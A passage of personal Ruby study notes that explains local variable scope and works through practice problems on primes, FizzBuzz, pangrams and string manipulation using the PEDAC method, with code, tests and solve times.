This code demonstrate the concept of local variable scope. The local variable
`word` is accessible inside the `greetings` method because we are passing it
as an argument when calling the same method.

**Time:** 07:23


## Example 6

```ruby
arr = [1, 2, 3, 4]

counter = 0
sum = 0

loop do
  sum += arr[counter]
  counter += 1
  break if counter == arr.size
end

puts "Your total is #{sum}"
```

The code returns `nil` and output `Your total is 10`.

On `line 1` we are initializing the local variable `arr` to an array object of
elements from `1` to `4`.

On `line 3` we are initializing the local variable `counter` to an integer
object `0`.

On `line 4` we are initializing the local variable `sum` to an integer object
`0`.

On `line 6-10` we are calling the `loop` method and passing in the `do..end`
block.

Inside the loop on `line 7` we are reassigning the local variable `sum` to
`sum + arr[counter]`, which `+=` is a shorthand of.

On `line 8` we are reassigning the local variable `counter` to `counter + 1`.

On `line 9` we are breaking out of the lopp if the condition is met.

On `line 11` we are calling the `puts` method and passing in the string `"Your
total is #{sum}"` to it. The local variable `sum` will be outputed as the actual
value it points to, stringified (like if we are using the `.to_s` method.

This code demonstrates the concept of local variable scopes. The `sum` variable
is modified inside the loop but its results still appears outside it on the last
line.

**Time:** 10:05


## Example 7

```ruby
a = 'Bob'

5.times do |x|
  a = 'Bill'
end

p a
```

**Answer:**

The code outputs `"Bill"` and returns `"Bill"`.

On `line 1` we are initializing local variable `a` to a String object.

On `line 3-5` we are calling the `times` method on Integer object `5`, passing
in a `do..end` block as an argument. The `do...end` block is executed once for
as many times as the `times` method is called (5 times), passing in the count
time as a parameter. Afterwards, the `times` method returns the Integer it was
called upon (`5`).

On `line 4`, we are reassigning the local variable `a` to a new String object
`"Bill"`.

On `line 7` we are palling the method `p`, passing in the local variable `a` to
it.

This code demonstrates how scopes work in Ruby.

**Time:** 09:01

## Example 8

```ruby
animal = "dog"

loop do |_|
  animal = "cat"
  var = "ball"
  break
end

puts animal
puts var
```

**Answer:**

The code will output `"cat"` and return `nil` then raise a `undefined local
variable` error.

On `line 1` we are initializing the local variable animal to a string object.

On `line 3-7` we are calling the method `loop` and passing in a `do..end`
block as an argument.

The `do..end` block is executed for each loop, with the parameter `_`.

On `line 4` we are reassigning the local variable `animal` to a new string of
value `"cat"`.

On `line 5` we are initializing the local variable `var` to a string object.

On `line 6` we are using keyword `break` to break out of the loop.

On `line 9` we are calling the method `puts` and passing in local variable
`animal` as an argument.

On `line 10` we are calling the method `puts` and passing in the local variable
`var`. Since `var` is initialized in a different scope, an error is raised at
this point.

This code demonstrates the concept of local variable in Ruby.

**Time: 08:58**


===

<!-- Source: computing/software/ruby/learning-tracks/practice-problems-others.md -->
<!-- URL: /computing/software/ruby/learning-tracks/practice-problems-others -->
<!-- Title: Practice Problems: Arrays Manipulation -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/practice-problems-others]], [[software/ruby/learning-tracks/practice-problems-others]], [[ruby/learning-tracks/practice-problems-others]], [[learning-tracks/practice-problems-others]], [[practice-problems-others]] -->

---
date: 2021-03-17T10:23
---

# Practice Problems: Arrays Manipulation

## Example 1

```ruby
=begin

Write a method that takes two arguments: the first is the starting number, and
the second is the ending number. Print out all numbers between the two numbers,
except if a number is divisible by 3, print "Fizz", if a number is divisible by
5, print "Buzz", and finally if a number is divisible by 3 and 5, print
"FizzBuzz".

# PEDAC

## Problem

Input: a start and end number
Output: a string with each multiple of 3 as Fizz, each multiple of 5 as Buzz
        and each multiple of 3 and 5 as FizzBuzz

Clarify:

- Return a single string? (yes)
- First and last number INCLUSIVE

## Data

Arrays of strings

## Algorithm

. Create local variable result to new Array
. Iterate from min to max
  . Case when divide by 3 and 5 and rest is 0
    . Save FizzBuzz
  . Case when divide by 3 and rest is 0
    . Save Fizz
  . Case when divide by 5 and rest is 0
    . Save Buzz
  . Other case
    . Save number (as string)
. Join the array with `, `

=end

def fizzbuzz(min, max)
  result = []

  min.upto(max) do |num|
    if num % 5 == 0 && num % 3 == 0
      result << 'FizzBuzz'
    elsif num % 3 == 0
      result << 'Fizz'
    elsif num % 5 == 0
      result << 'Buzz'
    else
      result << num.to_s
    end
  end

  result.join(', ')
end

p fizzbuzz(1, 15) == '1, 2, Fizz, 4, Buzz, Fizz, 7, 8, Fizz, Buzz, 11, ' \
                     'Fizz, 13, 14, FizzBuzz'
```
**Time:** 09:08

## Example 2

```ruby
=begin
Write a method that takes two numbers. Return an array containing all primes
between the two numbers (include the two given numbers in your answer if they
are prime). Don't use Ruby's 'prime' class.

# PEDAC

## Problem

Find all prime numbers between the two given numbers.

Input: a min and max integer
Output: every prime number between min and max (INCLUSIVE)

Clarification:

- Min/max are included
- A prime number is a number that can only be found by multiplying it by
  itself, i.e. is not a product in which both numbers are smaller than itself
- Prime is a natural number greater than 1
- A prime number can be found by trial division

## Data

Arrays of Integers

## Algorithm

. Init a local variable primes_num to a new Array object
. Iterate from min (given number) up to max (given number)
  . Check if current number can be divised by one number between 2 and itself
    . If not divisable, add current number to to primes_num
. Return primes_num

=end

def prime?(candidate)
  limit = Integer.sqrt(candidate)

  2.upto(limit) do |num|
    if candidate % num == 0
      return false
    end
  end
end

def find_primes(min, max)
  primes_num = []
  min = 2 if min < 2

  min.upto(max) do |number|
    if prime?(number)
      primes_num << number
    end
  end

  primes_num
end

p find_primes(3, 10) == [3, 5, 7]
p find_primes(11, 20) == [11, 13, 17, 19]
p find_primes(100, 101) == [101]
p find_primes(1, 100) == [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41,
                          43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97]
p find_primes(1, 2) == [2]
```

**Time:** 31:25

## Example 3

```ruby
=begin

Write a method that will determine whether an integer is a prime. Do not use the
Prime class.

# PEDAC

## Problem

Given a number, return true if it is a prime number, false otherwise.

Input: a number
Output: a boolean (true if prime, false otherwise)

Clarification:

- Do not use Prime class
- Prime is a number that cannot be created by multiplying natural number
  smaller than itself

## Data

Integer

## Algorithm

. Iterate from 2 to the square root of given number
  . For each number, find if it can divide given number
    . If true, return false
. Return true

=end

def prime?(num)
  num_sqrt = Integer.sqrt(num)

  2.upto(num_sqrt) do |denominator|
    return false if num % denominator == 0
  end

  true
end

p prime?(3) == true
p prime?(4) == false
```

**Time:** 05:58

## Example 4

```ruby
=begin

Write a method that will take an array of numbers and return the number of
primes in the array.

# PEDAC

## Problem

Given an array of numbers, count the number of prime it contains.

Input: array of number
Output: a integer, the number of prime in the given array

Clarification:

- Prime are numbers that cannot be found by multiplying a number between 2 and
  itself
- Array can have 2 same number? (Yes)

## Data

Arrays

## Algorithm

. COUNT
. Iterate over the array
  . Count the number of element that are prime by passing them to PRIME?
. Return the count number

. PRIME?
. Return false if num is less than 2
. Init the limit to the square root of the given number
. Iterate from 2 to limit, passing in factor
  . Return false if given number divided by factor remains zero
. Return true

=end

def prime?(candidate)
  return false if candidate < 2

  limit = Integer.sqrt(candidate)

  2.upto(limit) do |factor|
    return false if candidate % factor == 0
  end

  true
end

def count_primes(numbers)
  numbers.count do |number|
    prime?(number)
  end
end

p count_primes([1, 2, 3, 4]) == 2
p count_primes([4, 6, 8, 10]) == 0
```

**Time:** 07:42

## Example 5

```ruby
=begin

Write a program that asks the user to enter an integer greater than zero, then
asks if the user wants to determine the sum or product of all numbers between 1
and the entered integer.

# PEDAC

## Problem

Create a program that takes two user inputs: an integer (> 0) then an order
(sum or product between 1 and the integer).

Inputs: a positive integer
        `sum` or `product`
Output: The sum or product of all numbers between 1 and the positive integer

Clarification:

- Loop or exit if unwanted input? (loop)
- Ask to retry at the end or not? (no)
- sum is 1 + 2 + 3 + .. n
- product is 1 * 2 * 3 * .. n
- Format output? (yes, string)

## Algorithm

. ASK_INTEGER
. Outputs a question that ask for an integer greater than zero
. Save the input
. Check if the input is desirable
  . Redo if not desirable
  . Otherwise go to ASK_OPERATION

. ASK_OPERATION
. Outputs a question that ask wether to sum or product
. Save input
. Check desirability of the input
  . Redo if not desirable
  . Otherwise save the return value of DO_SUM or DO_PRODUCT
  . And go to OUTPUT_OPERATION

. OUTPUT_OPERATION
. Outputs the return value

. DO_SUM
. Iterate from 1 to input number and sum them

. DO_PRODUCT
. Iterate from 1 to input number and multiply them

=end

def ask_integer
  input_integer = 0

  puts "Please input a positive number:"

  loop do
    input_integer = gets.chomp.to_i

    break if input_integer.positive?

    puts "Sorry, your input must be an integer greater than zero."
  end

  input_integer
end

def ask_operation
  possible_input = %w(sum product)
  input_operation = nil

  puts "Do you want to sum or product numbers between 1 and your number?"
  puts "Please enter 'sum' or 'product'."

  loop do
    input_operation = gets.chomp

    break if possible_input.include?(input_operation)

    puts "Sorry, please enter 'sum' or 'product' without '."
  end

  input_operation
end

def do_operation(integer, operation)
  result = 0

  if operation == 'sum'
    result = (1..integer).to_a.sum
  elsif operation == 'product'
    result = (1..integer).to_a.reduce(:*)
  end

  result
end

def output_operation(integer, operation, result)
  puts "The result of #{operation} between 1 and #{integer} is #{result}!"
end

def sum_or_product
  input_integer = ask_integer
  input_operation = ask_operation

  result = do_operation(input_integer, input_operation)
  output_operation(input_integer, input_operation, result)
end

sum_or_product
```

**Time:** 29:10

## Example 6

```ruby
=begin

Write a method that returns the number of Friday the 13ths in the year given by
an argument. You may assume that the year is greater than 1752 (when the United
Kingdom adopted the modern Gregorian Calendar) and that it will remain in use
for the foreseeable future.

# PEDAC

## Problem

Return the number of Friday the 13th in a given year. (Gregorian Calendar)

Input: an integer, representing a year (after 1752)
Output: an integer, representing the number of F the 13ths for the given year

Clarification:

- After 1752 (Gregorian Calendar)
- Between 0 and 12
- Use Date lib

## Data

Array

## Algorithm

. Init a local variable month to integer 1
. Init a local variable friday_13_list to empty array
. Loop
  . Using the given year, check if the 13 of the current month (iteration) for
    this year, is a Friday
    . Save results to friday_13_list if true
  . Increment month by 1
  . Break if month is 12 or more
. Return the count size of friday_13_list

=end
require 'date'

def friday_13th(year)
  month = 1
  friday_13_list = []

  loop do
    break if month > 12
    friday_13_list << month if Date.new(year, month, 13).friday?

    month += 1
  end

  friday_13_list.size
end

p friday_13th(2015) == 3
p friday_13th(1986) == 1
p friday_13th(2019) == 2
```

**Time:** 11:31

## Example 7

```ruby
=begin

A pangram is a sentence that contains every single letter of the alphabet at
least once. For example, the sentence "The quick brown fox jumps over the lazy
dog" is a pangram, because it uses the letters A-Z at least once (case is
irrelevant).

Given a string, detect whether or not it is a pangram. Return True if it is,
False if not. Ignore numbers and punctuation.

# PEDAC

## Problem

Return true or false, based on wether the given string is a pangram or not.

Input: a string
Output: true or false, if the given string is a pangram or not

Clarification:

-  Pangram must have every letter of the English alphabet (26)
-  Case does not matter
-  Save character can be repeated one or more time

## Data

Array

## Algorithm

.  Init a constant ALPHABET with every letter of the English alphabet
.  Iterate over ALPHABET
  .  For each letter, check if it is inside the given string
    .  Return false if not
.  Return true

=end

ALPHABET = ('a'..'z').to_a

def pangram?(string)
  string.downcase!

  ALPHABET.each do |letter|
    unless string.include?(letter)
      return false
    end
  end

  true
end

p pangram?("The quick brown fox jumps over the lazy dog.") == true
p pangram?("This is not a pangram.") == false
```

**Time:** 04:49

## Example 8

```ruby
=begin

Write Number in Expanded Form

You will be given a number and you will need to return it as a string in
Expanded Form.

NOTE: All numbers will be whole numbers greater than 0.

# PEDAC

## Problem

Given a number, return its expanded form as a string.

Expanded form is a method for writing numbers that breaks the number down into
digits.

Input: an integer greater than 0
Output: a string representing the expanded form of the given integer

Clarification:

-  Return 0 when given 0
-  Return the number if given num <= 10
-  If the expanded form contains 0, do not write it

## Data

Array

## Algorithm

.  Return num if num is smaller or equal to 10
.  Init a local variable expanded_num
.  Init a local variable size to the size of the string of the given integer -1
.  Init a local variable digits to a new array of digits from the string of the
.  Re-integerize every string in the array
.  Init a local variable current_digit to 0
   given integer
.  Iterate trough size to 0 passing in power
  .  Multiply the current digit of digits by the number by 10 ^ power
  .  Save the result to expanded_num unless it's 0
  .  Increment current_digit by 1
.  Join the result with +

=end

def find_expanded_form(digits)
  size = digits.size - 1
  current_digit = 0
  results = []

  size.downto(0) do |power|
    expanded = digits[current_digit] * (10**power)
    results << expanded unless expanded == 0
    current_digit += 1
  end

  results
end

def expanded_form(number)
  return number if number <= 10

  digits = number.to_s.split('').map(&:to_i)

  find_expanded_form(digits).join(' + ')
end

p expanded_form(12) == '10 + 2'
p expanded_form(42) == '40 + 2'
p expanded_form(70304) == '70000 + 300 + 4'
```

**Time:** 25:17

## Example 9

```ruby
=begin

Write a function, persistence, that takes in a positive parameter num and
returns its multiplicative persistence, which is the number of times you must
multiply the digits in num until you reach a single digit.

For example:

persistence(39) # returns 3, because 3*9=27, 2*7=14, 1*4=4
                # and 4 has only one digit
persistence(999) # returns 4, because 9*9*9=729, 7*2*9=126,
                 # 1*2*6=12, and finally 1*2=2
persistence(4) # returns 0, because 4 is already a one-digit number

# PEDAC

## Problem

Given a number, return the number of times it takes to get to one digit by
divising its digits.

Input: an integer
Output: an integer, te number of multiplication to do to get to on digit from
        integer

Clarification:

-  Positive number
-  Persistenec is the number of tiems to multiply to get to a single digit
-  num < 10 returns 0

## Data

Arrays

## Algorithm

.  Init a local variable index to 0
.  Until digits of `num` is less than 10, iterate
  .  Takes the digits of the number and multiply them
  .  Save the result to `num`
  .  Increment index by 1
  .  (Continue until condition is met)
.  Return `num`

=end

def persistence(num)
  index = 0

  until num < 10
    num = num.digits.reduce(:*)
    index += 1
  end

  index
end

p persistence(39) == 3
p persistence(4) == 0
p persistence(25) == 2
p persistence(999) == 4
```

**Time:** 09:09


===

<!-- Source: computing/software/ruby/learning-tracks/practice-problems-string-manipulation.md -->
<!-- URL: /computing/software/ruby/learning-tracks/practice-problems-string-manipulation -->
<!-- Title: Practice Problems: Substrings Manipulation -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/practice-problems-string-manipulation]], [[software/ruby/learning-tracks/practice-problems-string-manipulation]], [[ruby/learning-tracks/practice-problems-string-manipulation]], [[learning-tracks/practice-problems-string-manipulation]], [[practice-problems-string-manipulation]] -->

---
date: 2021-03-01T22:48
---

# Practice Problems: Substrings Manipulation

## Example 1

```ruby
=begin

Give an array of strings made only from lowecase letters, return an array of
all characters that show up in all strings within the given array (including
duplicates).
For example, if a character occurs 3 times in all strings but not 4 times, you
need to include that character three times in the final answer.

# PEDAC

## Problem

Input: an array of one or more strings (lowecase English letters)
Output: an array containing letters included in every string of the given
        array, as many as they occurs in each string

Clarifying:

- Array consist of one or more strings
- English alphabet
- Orders of the letters matter

## Examples

See results

## Data

Array of strings

## Algorithm

. Init analyzed_letter array to contain letters already analyzed
. Init result array to contain the result

. Iterate over each letter of the first element of the given array
  . Continue to next if the current letter is already in analyzed_letter
  . Add the current letter to analyzed_letter
  . Check if current letter appears in each string of the array
    . Count the occurence of the current letter in each string and return min
    . Add current letter * min to result
. Retrun result

## Code

=end

def common_chars?(array, char)
  array.all? do |string|
    string.chars.include?(char)
  end
end

def common_chars(array)
  analyzed_letter = Array.new
  result = Array.new

  array[0].chars.each do |char|
    next if analyzed_letter.include?(char)
    analyzed_letter << char

    is_common = common_chars?(array, char)

    if is_common
      occurence = Array.new

      array.each do |string|
        occurence << string.chars.count(char)
      end

      occurence.min.times do
        result << char
      end
    end
  end

  result
end

p common_chars(["bella", "label", "roller"]) == ["e", "l", "l"]
p common_chars(["cool", "lock", "cook"]) == ["c", "o"]
p common_chars(["hello", "goodbye", "booya", "random"]) == ["o"]
p common_chars(["aabbaaaa", "ccdddddd", "eeffee", "ggrrrrr", "yyyzzz"]) == []
```

**Time:** 25:15

## Example 2

```ruby
=begin

You have to create a method that takes a positive integer number and returns
the next bigger number formed by the same digits:

12 ==> 21
513 ==> 531
2017 ==> 2071

If no bigger number can be composed using those digits, return -1:

9 ==> -1
111 ==> -1
531 ==> -1

# PEDAC

## Problem

Input: a positive integer number
Output: the next bigger number formed by the same digits, or -1 if it's
        impossible

Clarifying:

- Number should be bigger than 11
- Number which are all the same digit returns -1
- Number's digits ascending returns -1
- Next biggest number is swapping number from the right if the rightmost is
  greater

## Data

Arrays

## Algorithm

. Return -1 if number is smaller or equal to 11
. Return -1 if number to string is all the same digit
. Return -1 if number to string's digits are ascending

. Loop on each digit descending for digits size -1
  . Check if current digit and current digit -1 are in ascending order
    . Flip them
    . Return
. Return new array, joined and integerized

=end

def next_bigger_num(number)
  return -1 if number <= 11
  digits = number.to_s.chars
  return -1 if digits.all?(number.to_s.chars[0])
  return -1 if digits.sort { |a, b| b.to_i <=> a.to_i } == digits

  index = digits.size - 1

  loop do
    break if index == 0

    if digits[index] > digits[index - 1]
      digits[index], digits[index - 1] = digits[index - 1], digits[index]
      break
    end
    index -= 1
  end

  digits.join.to_i
end

p next_bigger_num(9) == -1
p next_bigger_num(12) == 21
p next_bigger_num(513) == 531
p next_bigger_num(2017) == 2071
p next_bigger_num(111) == -1
p next_bigger_num(531) == -1
p next_bigger_num(123456789) == 123456798
```

**Time:** 54:32


## Example 3

```ruby
=begin

Write a function scramble(str1, str2) taht returns true if a portion of str1
characters can be rearranged to match str2, otherwise returns false.

For example:
str1 is 'rkqodlw' and str2 is 'world' the output should return true.
str1 is 'cedewaraaossoqqyt' and str2 is 'codewars' should return true.
str1 is 'katas' and str2 is 'steak' should return false.

Only lower case letters will be used (a-z). No punctuation or digits will be
included.

# PEDAC

## Problem

Create a method that return true if the letters from str1 can be rearranged to
match str2.

Input: Two strings (a-z)
Output: true if condition above met, false otherwise

Clarify:

- Only a-z English letters
- str1 needs to have more letters than str2 for it to be true

## Data

Array of strings

## Algorithm

. Return false if str1 is smaller than str2

. Init local variable selected_chars
. Convert str1 and str2 to their array of chars
. Loop for as many char that arr2 have
  . Check for each letters of arr2 if it appears in arr1
    . If yes, remove it from arr1 and add to selected_chars
    . If no, return false
. Return true

=end

def scramble(str1, str2)
  arr1 = str1.chars
  arr2 = str2.chars
  selected_chars = Array.new

  arr2.each do |char2|
    if arr1.include?(char2)
      selected_chars << char2
      arr1.delete_at(arr1.index(char2))
    else
      return false
    end
  end

  true
end

p scramble('javaass', 'jjss') == false
p scramble('rkqodlw', 'world') == true
p scramble('cedewaraaossoqqyt', 'codewars') == true
p scramble('katas', 'steak') == false
p scramble('scriptjava', 'javascript') == true
p scramble('scriptingjava', 'javascript') == true
```

**Time:** 17:55

## Example 4

```ruby
=begin

PROBLEM:

Given a string, write a method change_me which returns the same string but with
all the words in it that are palindromes uppercased.

change_me("We will meet at noon") == "We will meet at NOON"
change_me("No palindromes here") == "No palindromes here"
change_me("") == ""
change_me("I LOVE my mom and dad equally") == "I LOVE my MOM and DAD equally"

# PEDAC

## Problem

Return the given string with palindromes in uppercase.

Input: a string
Output: a string with palindromes in uppercase

Clarify:

- Does it have to be the same string? (no)
- Does case have an inpact on the string being a palindrome or not? (no)
- Return empty string if empty string

## Data

Arrays of strings

## Algorithm

. Create an array which each word of the given string
. Create a new result array
. Iterate over the array
  . For each word, check PALINDROME
    . Uppcase the result and add to new array if it is
    . Only add to new result array otherwise
. Return joined array

=end

def palindrome?(word)
  word.downcase.reverse == word.downcase
end

def change_me(string)
  candidate_list = string.split

  result = candidate_list.map do |word|
    if palindrome?(word)
      word.upcase
    else
      word
    end
  end

  result.join(' ')
end

p change_me("We will meet at noon") == "We will meet at NOON"
p change_me("No palindromes here") == "No palindromes here"
p change_me("") == ""
p change_me("I LOVE my mom and dad equally") == "I LOVE my MOM and DAD equally"
```

**Time:** 10:40

## Example 5

```ruby
=begin
# Reverse a string, without using String#reverse

# PEDAC

## Problem

Reverse string manually

Input: a string
Output: reversed string

Clarify:

- Case not changed
- Emptry string returns empty? (Yes)
- Shall returns the same string? (No)

## Data

Arrays

## Algorithm

. Init a new local var reversed to String object
. Transform the string into array of its characters
. Loop for array length
  . Take the last characters and add it to reversed
  . Continue until array is empty
. Return reversed as a string

=end

def string_reverser(string)
  reversed = ''

  array = string.chars

  loop do
    reversed << array.pop
    break if array.empty?
  end

  reversed
end

p string_reverser('hello') == 'olleh'
p string_reverser('Launch School') == 'loohcS hcnuaL'
```

**Time:** 07:22

## Example 6

```ruby
=begin

Write a method that converts an english phrase into a mathematical expression,
step by step.

# PEDAC

## Problem

Write a method that convert string to integer and do the calculation.

Input: a string with two numbers and an operation, in English
Output: an Integer, the result of the operation

Clarification:

- English phrase are words separated by spaces? (Yes)
- Only one operation per string? (Yes)
- Operations are 'plus', 'minus', 'multipy', 'divide' ? (Yes)
- Take care of case

## Data

Arrays

## Algorithm

. Init a constant NUMBERS to a new Array of elements zero, one etc until nine
. Init a constant OPERATIONS to a new Array of elements plus, minus etc

. FIND_INTEGERS
. Init a local variable integers to a new empty Array
. Create an array of strings by separating by space
. Iterate over the array
  . Check if the current word is in NUMBERS
    . Save the index of NUMBERS for current word in integers
  . Repeat
. DO_OPERATION, passing in integers and the sting array
. Return return value of DO_OPERATION

. DO_OPERATION
. Iterate over the array
  . Check if the current word is in OPERATIONS
    . Do the correct operation accordingly
    . Return result

=end

NUMBERS = %w(zero one two three four five six seven eight nine)
OPERATIONS = %w(plus minus)

def do_operation(integers, expression_list)
  operation = ''

  expression_list.each do |word|
    if OPERATIONS.include?(word)
      operation = word
      break
    end
  end

  if operation == 'plus'
    integers.reduce(:+)
  elsif operation == 'minus'
    integers.reduce(:-)
  end
end

def computer(expression)
  integers = []
  expression_list = expression.downcase.split(' ')

  expression_list.each do |word|
    if NUMBERS.include?(word)
      integers << NUMBERS.index(word)
    end
  end

  result = do_operation(integers, expression_list)

  result
end

p computer("two plus two") == 4
p computer('seven minus six') == 1
p computer('zero plus eight') == 8
```

**Time:** 23:00

## Example 7

```ruby
=begin

Write a method that takes a single String argument and returns a new string
that contains the original value of the argument with the first character of
every word capitalized and all other letters lowercase. You may assume that
words are any sequence of non-blank characters.

# PEDAC

## Problem

Given a String, for every sequence of non-blank characters, capitalized their
first letter if they start with a letter. (Return new String)

- Input: a string of one or more words
- Output: a new string with each word capitalized

Clarification:

- New String
- Only first letter of word
- Word is a sequence of non-blank characters
- Every other letter must be lowercase

## Data

Array

## Algorithm

. Init a new local variable capitalized to an empty Array object
. From the string, create an array of downcase "word" (separate by blank
  characters)
. Iterate over this array
  . For each iteration, then upcase its first letter
. Return the return value of the iteration as a string separated by whitespaces

=end

def word_cap(string)
  string.downcase.split(' ').map(&:capitalize).join(' ')
end

p word_cap('four score and seven') == 'Four Score And Seven'
p word_cap('the javaScript language') == 'The Javascript Language'
p word_cap('this is a "quoted" word') == 'This Is A "quoted" Word'
```

**Time:** 12:35

## Example 8

```ruby
=begin

Consider the word "abode". We can see that the letter a is in position 1 and b
is in position 2. In the alphabet, a and b are also in positions 1 and 2.
Notice also that d and e in abode occupy the positions they would occupy in the
alphabet, which are positions 4 and 5.

Given an array of words, return an array of the number of letters that occupy
their positions in the alphabet for each word. For example,

solve(["abode","ABc","xyzD"]) = [4, 3, 1]

Input will consist of alphabet characters, both uppercase and lowercase. No
spaces.

# PEDAC

## Problem

Count the numbers of letters that are at their right place in the string and in
the alphabet.

Input: an array of strings with letters at their corresponding place in the
       alphabet, or not
Output: an array of numbers representing the number of letters in their right
        place in the alphabet

Clarification:

-  Case does not matter
-  Alphabet has 26 letters
-  If the string is more than 26 letters, everything above can be omited? (Yes)
-  Return 0 if none found
-  Returned array and given array should be the same size

## Data

Arrays

## Algorithm

.  MAIN
. Init ALPHABET whith every letter of the alphabet
.  Init local variable results
  .  Iterate over the given array passing in string
    .  Call COUNT_LETTER_IN_ORDER passing in string (downcase) as an arg
    .  Save return value to results
.  Return results

.  COUNT_LETTER_IN_ORDER
.  Init local var counter
  .  Iterate from 0 upto string size
    .  Check if the current character of the string is equal to the character
       at the same index in constant ALPHABET
      .  Increment counter if true
.  Return counter

=end

ALPHABET = ('a'..'z').to_a

def count_letter_in_order(string)
  counter = 0

  0.upto(string.size) do |position|
    if string[position] == ALPHABET[position]
      counter += 1
    end
  end

  counter
end

def solve(array)
  results = []

  array.each do |string|
    results << count_letter_in_order(string.downcase)
  end

  results
end

p solve(["abode", "ABc", "xyzD"]) == [4, 3, 1]
p solve(["abide", "ABc", "xyz"]) == [4, 3, 0]
p solve(["IAMDEFANDJKL", "thedefgh", "xyzDEFghijabc"]) == [6, 5, 7]
p solve(["encode", "abc", "xyzD", "ABmD"]) == [1, 3, 1, 3]
```

**Time:** 12:35

## Example 9

```ruby
=begin

Given a string of integers, return the number of odd-numbered substrings that
can be formed.

For example, in the case of "1341", they are 1, 1, 3, 13, 41, 341, 1341, a
total of 7 numbers.

# PEDAC

## Problem

Return the number of odd-numbered substrings that can be formed from a given
string.

Input: a string of a number
Output: the number of substring from the given string that are odd

Clarification:

- Assume always a well formed string? (Yes)
- Return 0 if nothing found? Yes
- Return an integer (not string)
- Substrings are part of the string, minimum 1 char

## Data

Arrays

## Algorithm

.  MAIN
.  Init local variable substr_integer to return value of FIND_EVERY_SUBSTRING
.  Call SELECT_ONLY_ODD passing in substr_integer to it
.  Return the count of the return value of SELECT_ONLY_ODD

.  FIND_EVERY_SUBSTRING
.  Init local variable substr_int
.  Iterate from 0 upto string size, passing in char_start as a param
  .  Iterate from char_start upto string size, passing in char_end as a param
    .  Slice string from char_start to char_end, convert to integer and save
       the result to substr_int
. Return substr_int

.  SELECT_ONLY_ODD
.  Iterate over the given integers array and select only odd numbers

=end

def find_every_substring(string)
  substr_int = []

  0.upto(string.size - 1) do |char_start|
    char_start.upto(string.size - 1) do |char_end|
      substr_int << string[char_start..char_end].to_i
    end
  end

  substr_int
end

def select_only_odd(integers)
  integers.select(&:odd?)
end

def solve(num_candidate)
  substr_integer = find_every_substring(num_candidate)

  select_only_odd(substr_integer).count
end

p solve("1341") == 7
p solve("1357") == 10
p solve("13471") == 12
p solve("134721") == 13
p solve("1347231") == 20
p solve("13472315") == 28
```

**Time:** 18:02

## Example 10

```ruby
=begin

Complete the function that takes an array of words.

You must concatenate the nth letter from each word to construct a new word
which should be returned as a string, where n is the position of the word in
the list.

For example:

["yoda", "best", "has"]  -->  "yes"
  ^        ^        ^
  n=0     n=1     n=2

# PEDAC

## Problem

Given an array, return the character at the index of the string for each string
and concatenate the result.

Input: an array of valid string
Output: the new word based on each character of each string of the array

Clarification:

-  Empty array return empty string
-  Case matters
-  Assume each strings has enough character
-  Assume each array only contains strings

## Data

Arrays

## Algorithm

.  Init local variable new_string to local variable string
.  Iterate through the array, passing in index and string as parameters
  .  Save the character of string at index in new_string
.  Return new_string

=end

def nth_char(array)
  new_string = ''

  array.each_with_index do |string, index|
    new_string << string[index]
  end

  new_string
end

p nth_char(['yoda', 'best', 'has']) == 'yes'
p nth_char([]) == ''
p nth_char(['X-ray']) == 'X'
p nth_char(['No', 'No']) == 'No'
p nth_char(['Chad', 'Morocco', 'India', 'Algeria', 'Botswana',
            'Bahamas', 'Ecuador', 'Micronesia']) == 'Codewars'
```

**Time:** 06:38

## Example 11

```ruby
=begin

Write a function that takes in a string of one or more words, and returns the
same string, but with all five or more letter words reversed. Strings passed
in will consist of only letters and spaces.
Spaces will be included only when more than one word is present.

Examples:

spin_words( "Hey fellow warriors" ) => returns "Hey wollef sroirraw"

# PEDAC

## Problem

Given a string, return it with every 5+ letters words inveresed.

Input: a string (letters and spaces only, one or more word)
Output: same string with 5+ letters words inversed

Clarification:

-  Same string? (no)
-  Case matter
-  No ponctuation
-  one word possible

## Data

Arrays

## Algorithm

.  From the string, create an array of words (words being characters delimited
   by spaces)
.  Iterate over the array
  .  Count the number of characters in the word
    .  If 5 or more characters, return it spinned
    .  Otherwise return the word
.  Return the new array, joined by spaces

=end

def spin_words(sentence)
  sentence.split.map do |word|
    word.length >= 5 ? word.reverse : word
  end.join(' ')
end

p spin_words('Hey fellow warriors') == 'Hey wollef sroirraw'
p spin_words('This is a test') == 'This is a test'
p spin_words('This is another test') == 'This is rehtona test'
p spin_words('test') == 'test'
```

**Time:** 07:33

## Example 12

```ruby
=begin

A string is considered to be in title case if each word in the string is either
(a) capitalised (that is, only the first letter of the word is in upper case)
or (b) considered to be an exception and put entirely into lower case unless it
is the first word, which is always capitalised.

Write a function that will convert a string into title case, given an optional
list of exceptions (minor words). The list of minor words will be given as a
string with each word separated by a space. Your function should ignore the
case of the minor words string -- it should behave in the same way even if the
case of the minor word string is changed.

# PEDAC

## Problem

Given a string, return the same string in title case, following the optional
list of exceptions.

Input: a string to title case and a string of exceptions (optional)
Output: the first string, with title case, minus the exceptions (if exists)

Clarification:

-  All case should be modified in the given string
-  Exceptions are optional
-  No punctuations? (yes)
-  Same string? (no)
-  First char always capitalized

## Data

Arrays of strings

## Algorithm

.  Downcase the optional exceptions string
.  From the optional exceptions string, make an array of strings
.  Downcase the whole given string
.  Make an array of strings from the given string
.  Iterate over the new array
  .  Capitalize the first letter of each element unless it's in the exceptions
     list
.  Join the array with one space char
.  Capitalize the new string and return

=end

def title_case(string, exceptions='')
  exceptions_list = exceptions.downcase.split(' ')
  strings_list = string.downcase.split(' ')

  title = strings_list.map do |word|
    if exceptions_list.include?(word)
      word
    else
      word.capitalize
    end
  end

  title[0][0] = title[0][0].capitalize

  title.join(' ')
end

p title_case('a clash of KINGS', 'a an the of') == 'A Clash of Kings'
p title_case('THE WIND IN THE WILLOWS', 'The In') == 'The Wind in the Willows'
p title_case('the quick brown fox') == 'The Quick Brown Fox'
```

**Time:** 16:12


===

<!-- Source: computing/software/ruby/learning-tracks/practice-problems-substrings.md -->
<!-- URL: /computing/software/ruby/learning-tracks/practice-problems-substrings -->
<!-- Title: Practice Problems: Substrings Manipulation -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/practice-problems-substrings]], [[software/ruby/learning-tracks/practice-problems-substrings]], [[ruby/learning-tracks/practice-problems-substrings]], [[learning-tracks/practice-problems-substrings]], [[practice-problems-substrings]] -->

---
date: 2021-03-01T09:20
---

